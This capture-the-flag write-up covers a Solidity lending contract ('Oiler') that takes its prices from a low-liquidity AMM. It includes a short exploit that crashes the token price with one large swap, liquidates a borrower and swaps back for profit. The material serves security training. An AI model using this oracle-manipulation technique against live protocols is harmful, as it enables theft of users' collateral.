# Oiler

## Challenge
In this challenge, we get 2 contracts. The first is a lending protocol:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20, ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";


interface IAMM {
    function getPriceToken0() external returns (uint256);
}

/**
 * @title Oiler
 */
contract Oiler is ERC20 {
    event Deposited(address depositor, uint256 collateralAmount);
    event Borrowed(address borrower, uint256 borrowedAmount);
    event Withdraw(address user, uint256 withdrawAmount);
    event Liquidated(address liquidator, address userLiquidated, uint256 amount);

    IERC20 public immutable token;
    IAMM public immutable amm;

    // Collateral Factor
    uint256 constant CF = 75;
    // 2 decimal points
    uint256 constant DECIMALS = 10 ** 2;
    // Threshold for health factor under which the position becomes eligible for liquidation
    uint256 constant LIQUIDATION_THRESHOLD = 100;

    struct User {
        uint256 collateral;
        uint256 borrow;
        bool liquidated;
    }

    mapping(address => User) public users;


    constructor(address _token, address _amm) ERC20("Debt Token", "dTOKEN") {
        token = IERC20(_token);
        amm = IAMM(_amm);
    }

    /**
     * @notice Deposits an amount of TOKEN into the contract as collateral
     * @dev Before calling this function, the user must have approved the contract to spend the specified amount of TOKEN
     * @param _amount The amount of TOKEN to deposit as collateral and added to the user's collateral balance
     */
    function deposit(uint256 _amount) public {
        token.transferFrom(msg.sender, address(this), _amount);
        users[msg.sender].collateral += _amount;

        emit Deposited(msg.sender, _amount);
    }

    /**
     * @notice Withdraws collateral from the contract given an amount of dTOKENs
     * @param _amount The amount of dTOKENs the user wants to burn in order to withdraw collateral
     */
    function withdraw(uint256 _amount) public {
        require(users[msg.sender].borrow >= _amount, "ERR: Withdraw > borrow");
        uint256 collateralToWithdraw = (_amount * users[msg.sender].collateral) / users[msg.sender].borrow;
        users[msg.sender].collateral -= collateralToWithdraw;
        users[msg.sender].borrow -= _amount;
        _burn(msg.sender, _amount);
        token.transfer(msg.sender, collateralToWithdraw);

        emit Withdraw(msg.sender, _amount);
    }

    /**
     * @notice Borrow desired amount of dTOKENs
     * @dev Must have enough collateral to borrow the desired amount of dTOKENs
     * @param  _amount The amount of dTOKENs to borrow
     */
    function borrow(uint256 _amount) public {
        uint256 maxBorrowAmount = maxBorrow(msg.sender);
        require(maxBorrowAmount >= _amount * DECIMALS, "ERR: Not Enough Collateral");
        _mint(msg.sender, _amount);
        users[msg.sender].borrow += _amount;

        emit Borrowed(msg.sender, _amount);
    }

    /**
     * @notice Calculate the health factor for a user's position
     * @dev If the user hasn't borrowed any tokens, it returns the maximum possible value
     * @param _user The address of the user
     * @return The health factor for the user. The value includes two decimal places
     */
    function healthFactor(address _user) public returns (uint256) {
        if (users[_user].borrow == 0) {
            // User has not borrowed any tokens, so health is theoretically infinite
            return type(uint256).max;
        }
        uint256 collateralValue = users[_user].collateral * getPriceToken();
        uint256 borrowValue = users[_user].borrow;
        uint256 hf = collateralValue * CF / borrowValue;
        // Includes 2 decimals
        return hf;
    }

    /**
     * @notice Fetch the price of the collateral token from the AMM pair oracle
     * @dev The price returned is denominated in 18 decimals
     * @return The price of the token in terms of the other token in the pair
     */
    function getPriceToken() public returns (uint256) {
        return amm.getPriceToken0();
    }

    /**
     * @notice Calculates the maximum amount of dTOKENs that a user can borrow, based on the value of their deposited collateral
     * @dev 2 decimal points precision. e.g., if result is 0.75 the function returns 75
     * @param _user Address of the user
     * @return The maximum amount of dTOKENs that the user can borrow
     */
    function maxBorrow(address _user) public returns (uint256) {
        return (users[_user].collateral * getPriceToken() * CF * DECIMALS / 100) - (users[msg.sender].borrow * DECIMALS);
    }

    /**
     * @notice Fetches the data of a specific user
     * @dev Returns a struct containing the user's collateral, borrowed amount and status
     * @param _user Address of the user
     * @return A struct containing the user's collateral and borrowed amount
     */
    function getUserData(address _user) public view returns (User memory) {
        return users[_user];
    }

    /**
     * @notice  Liquidates a user's position if their health factor falls below the liquidation threshold.
     * @param   _user The address of the user to liquidate.
     *  The process of liquidation involves repaying a portion of the user's debt,
     *  burning debt tokens from the liquidator, and transferring all of 
     *  the user's collateral to the liquidator.
     *  The user's borrow amount and collateral are then updated.
     */
    function liquidate(address _user) public {
        uint256 positionHealth = healthFactor(_user) / 10 ** 18;
        require(positionHealth < LIQUIDATION_THRESHOLD, "Liquidate: User not underwater");
        uint256 repayment = users[_user].borrow * 5 / 100;
        _burn(msg.sender, repayment);
        users[_user].borrow -= repayment;
        uint256 totalCollateralAmount = users[_user].collateral;
        token.transfer(msg.sender, totalCollateralAmount);
        users[_user].collateral = 0;
        users[_user].liquidated = true;

        emit Liquidated(msg.sender, _user, repayment);
    }
}
```

We also get the code for an AMM, which simply explained can be used to swap tokens to DAI, and is the place where the lending protocol gets its price quotes from.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title AMM
 * @notice ASSUME THIS CONTRACT DOES NOT HAVE TECHNICAL VULNERABILITIES. 
 * Modified from: https://solidity-by-example.org/defi/constant-product-amm/
 */
contract AMM {
    IERC20 public immutable token0;
    IERC20 public immutable token1;

    uint256 public reserve0;
    uint256 public reserve1;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    /**
     * @dev Constructor that sets the addresses of the two tokens in the AMM
     * @param _token0 The address of the first token
     * @param _token1 The address of the second token
     */
    constructor(address _token0, address _token1) {
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
    }

    /**
     * @dev Mint new shares
     * @param _to The address to mint the shares to
     * @param _amount The amount of shares to mint
     * @notice This function is an utility function used by other functions in the contract
     */
    function _mint(address _to, uint256 _amount) private {
        balanceOf[_to] += _amount;
        totalSupply += _amount;
    }

    /**
     * @dev Burn shares
     * @param _from The address to burn the shares from
     * @param _amount The amount of shares to burn
     */
    function _burn(address _from, uint256 _amount) private {
        balanceOf[_from] -= _amount;
        totalSupply -= _amount;
    }

    /**
     * @dev Update the reserves of the AMM
     * @param _reserve0 The new reserve of the first token
     * @param _reserve1 The new reserve of the second token
     */
    function _update(uint256 _reserve0, uint256 _reserve1) private {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
    }

    /**
     * @dev Swap tokens
     * @param _tokenIn The address of the token to swap in
     * @param _amountIn The amount of tokens to swap in
     */
    function swap(address _tokenIn, uint256 _amountIn) external returns (uint256 amountOut) {
        require(_tokenIn == address(token0) || _tokenIn == address(token1), "invalid token");
        require(_amountIn > 0, "amount in = 0");

        bool isToken0 = _tokenIn == address(token0);
        (IERC20 tokenIn, IERC20 tokenOut, uint256 reserveIn, uint256 reserveOut) =
            isToken0 ? (token0, token1, reserve0, reserve1) : (token1, token0, reserve1, reserve0);

        tokenIn.transferFrom(msg.sender, address(this), _amountIn);

        uint256 amountInWithFee = (_amountIn * 997) / 1000;
        amountOut = (reserveOut * amountInWithFee) / (reserveIn + amountInWithFee);

        tokenOut.transfer(msg.sender, amountOut);

        _update(token0.balanceOf(address(this)), token1.balanceOf(address(this)));
    }

    /**
     * @dev Add liquidity to the AMM
     * @param _amount0 The amount of the first token to add
     * @param _amount1 The amount of the second token to add
     */
    function addLiquidity(uint256 _amount0, uint256 _amount1) external returns (uint256 shares) {
        token0.transferFrom(msg.sender, address(this), _amount0);
        token1.transferFrom(msg.sender, address(this), _amount1);

        if (reserve0 > 0 || reserve1 > 0) {
            require(reserve0 * _amount1 == reserve1 * _amount0, "x / y != dx / dy");
        }

        if (totalSupply == 0) {
            shares = _sqrt(_amount0 * _amount1);
        } else {
            shares = _min((_amount0 * totalSupply) / reserve0, (_amount1 * totalSupply) / reserve1);
        }
        require(shares > 0, "shares = 0");
        _mint(msg.sender, shares);

        _update(token0.balanceOf(address(this)), token1.balanceOf(address(this)));
    }

    /**
     * @dev Remove liquidity from the AMM
     * @param _shares The amount of shares to remove
     */
    function removeLiquidity(uint256 _shares) external returns (uint256 amount0, uint256 amount1) {
        // bal0 >= reserve0
        // bal1 >= reserve1
        uint256 bal0 = token0.balanceOf(address(this));
        uint256 bal1 = token1.balanceOf(address(this));

        amount0 = (_shares * bal0) / totalSupply;
        amount1 = (_shares * bal1) / totalSupply;
        require(amount0 > 0 && amount1 > 0, "amount0 or amount1 = 0");

        _burn(msg.sender, _shares);
        _update(bal0 - amount0, bal1 - amount1);

        token0.transfer(msg.sender, amount0);
        token1.transfer(msg.sender, amount1);
    }

    /**
     * @dev Calculate the square root of a number
     * @param y The number to calculate the square root of
     */
    function _sqrt(uint256 y) private pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }

    /**
     * @dev Calculate the minimum of two numbers
     * @param x The first number
     * @param y The second number
     */
    function _min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }

    /**
     * @dev Get the price of the first token
     * @return The price of the first token
     */
    function getPriceToken0() public view returns (uint256) {
        return (reserve1 * 1e18) / reserve0;
    }

    /**
     * @dev Get the price of the second token
     * @return The price of the second token
     */
    function getPriceToken1() public view returns (uint256) {
        return (reserve0 * 1e18) / reserve1;
    }
}
```

Challenge Description:

The favorite lending protocol in town has opened its doors and is allowing anyone to deposit collateral to borrow debt tokens! The Risk analysis department assures the protocol is sound as a Swiss banking system, and the Tokenomic analysis team argues that if a user's position becomes under-collateralized, the liquidator must receive all of the users collateral as a reward for keeping the protocol vault from bad debt, while punishing the borrower for not managing his positions accordingly!

As users start opening debt positions, you notice something unusual in the way that the protocol calculates user account health... something is off here... and it seems that the consequences can result in user positions being liquidated by the attacker who will also make a profit out of it!

Can you demonstrate the viability of this attack to convince the Risk and Tokenomic departments to urgently update the protocol?

📌 Drop the borrower's health account.

📌 Liquidate the borrower and get as much of his collateral as possible.

## Solution
In our case, we can abuse the very low liquidity in the AMM to manipulate the price of the token so that we can liquidate the borrower. We can do this with a few simple steps:
1. Deposit 6 tokens and borrow 4 DAI to have 4 debt tokens to burn when we liquidate the borrower
2. Use our other 94 tokens to swap them for DAI at the AMM and crash the price
3. Liquidate the borrower
4. Swap all our DAI back to tokens

I implemented it in the POC like this:

```solidity
//First we deposit and borrow so we have 4 debt tokens that we can burn later when we liquidate
token.approve(address(oiler), 6);
oiler.deposit(6);
oiler.borrow(4);

//Now we use the low liquidity to crash the price of the token
token.approve(address(amm), 94);
amm.swap(address(token), 94);

//Now we burn the debt tokens and liquidate the victim
oiler.liquidate(address(superman));

//Finally we swap the DAI for the token and we have more than 200 tokens
dai.approve(address(amm), dai.balanceOf(address(player)));
amm.swap(address(dai), dai.balanceOf(address(player)));
```

This solves the challenge, with the extra requirement of having 200 tokens.